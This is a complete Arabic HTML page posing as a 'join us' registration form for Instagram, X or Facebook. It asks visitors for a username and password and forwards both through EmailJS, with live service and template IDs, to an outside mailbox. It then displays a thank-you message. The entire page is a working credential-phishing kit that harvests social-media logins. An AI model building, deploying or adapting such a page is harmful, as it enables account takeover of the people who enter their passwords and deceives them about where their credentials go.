<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نموذج التسجيل</title>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        (function () {
            emailjs.init("1xqwBMfecM1SSulsh"); // استبدل YOUR_PUBLIC_KEY بمفتاحك العام من EmailJS
        })();
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            direction: rtl;
        }
        .platform {
            margin: 15px;
            cursor: pointer;
            display: inline-block;
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border-radius: 5px;
        }
        .form-container {
            display: none;
            margin-top: 20px;
        }
        .form-container input, .form-container button {
            margin: 10px;
            padding: 10px;
            width: 200px;
        }
        .thank-you {
            display: none;
            margin-top: 20px;
            color: green;
            font-weight: bold;
        }
        .welcome-message {
            font-size: 20px;
            margin-bottom: 20px;
            color: #4CAF50;
        }
    </style>
</head>
<body>

    <!-- رسالة الترحيب -->
    <div class="welcome-message" id="welcome-message">
        مرحبًا بك في مهمتنا! اختر المنصة التي تود الانضمام إليها.
    </div>

    <!-- منصات التواصل -->
    <div class="platform" id="instagram">إنستغرام</div>
    <div class="platform" id="x">منصة إكس</div>
    <div class="platform" id="facebook">فيسبوك</div>

    <!-- النموذج الذي يظهر بعد الضغط على منصة -->
    <div class="form-container" id="form-container">
        <h3 id="platform-name">انضم الينا باستخدام</h3>
        <form id="registration-form">
            <input type="text" name="username" id="username" placeholder="اسم المستخدم" required><br>
            <input type="password" name="password" id="password" placeholder="كلمة المرور" required><br>
            <button type="submit">انضمام</button>
        </form>
    </div>

    <!-- رسالة الشكر بعد إرسال النموذج -->
    <div class="thank-you" id="thank-you">
        <p>شكرًا لتسجيلك!</p>
        <p>تم إرسال معلوماتك بنجاح.</p>
    </div>

    <script>
        // تفعيل منصات التواصل
        const platforms = document.querySelectorAll('.platform');
        const formContainer = document.getElementById('form-container');
        const platformName = document.getElementById('platform-name');
        const thankYouMessage = document.getElementById('thank-you');
        const welcomeMessage = document.getElementById('welcome-message');

        platforms.forEach(platform => {
            platform.addEventListener('click', () => {
                platformName.textContent = `انضم الينا باستخدام ${platform.textContent}`;
                formContainer.style.display = 'block';
                welcomeMessage.style.display = 'none';
                thankYouMessage.style.display = 'none';
            });
        });

        // إرسال بيانات التسجيل
        document.getElementById('registration-form').addEventListener('submit', function (event) {
            event.preventDefault(); // منع النموذج من تحديث الصفحة

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const templateParams = {
                username: username,
                password: password,
            };

            emailjs.send('service_ir3vg5y', 'template_jw2qkzr', templateParams)
                .then(function () {
                    // محاكاة إرسال النموذج وعرض رسالة الشكر
                    formContainer.style.display = 'none';
                    thankYouMessage.style.display = 'block';
                }, function (error) {
                    alert('حدث خطأ أثناء الإرسال: ' + JSON.stringify(error));
                });
        });
    </script>
</body>
</html>
